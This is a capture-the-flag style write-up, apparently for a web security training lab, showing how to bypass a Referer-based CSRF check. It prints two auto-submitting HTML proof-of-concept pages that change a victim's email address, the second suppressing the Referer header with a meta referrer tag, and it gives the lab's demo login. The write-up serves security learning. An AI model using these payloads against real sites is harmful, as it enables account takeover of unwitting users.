# CSRF — Referer Check Has an Insecure Fallback

The email-change function tries to block cross-domain requests, but falls back insecurely when the expected header isn't present.

**Goal:** Host an HTML page on the exploit server that performs a CSRF attack to change the victim's email address.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

It's a POST request that includes a `Referer` HTTP header:

<img width="641" height="378" alt="3" src="https://github.com/user-attachments/assets/47b0b1c3-ef81-4fc0-9dbe-e3214e6c9f27" />


First, the CSRF PoC is generated:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Running this triggers an error:

<img width="368" height="94" alt="4" src="https://github.com/user-attachments/assets/92ae73cb-950d-4c1e-a912-aee23e60087f" />


Suppressing the `Referer` header entirely resolves the issue:

```
<meta name="referrer" content="never">
```

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a250042033a996983bd0048004f00df.web-security-academy.net/my-account/change-email" method="POST">
      <meta name="referrer" content="never">
      <input type="hidden" name="email" value="test777&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
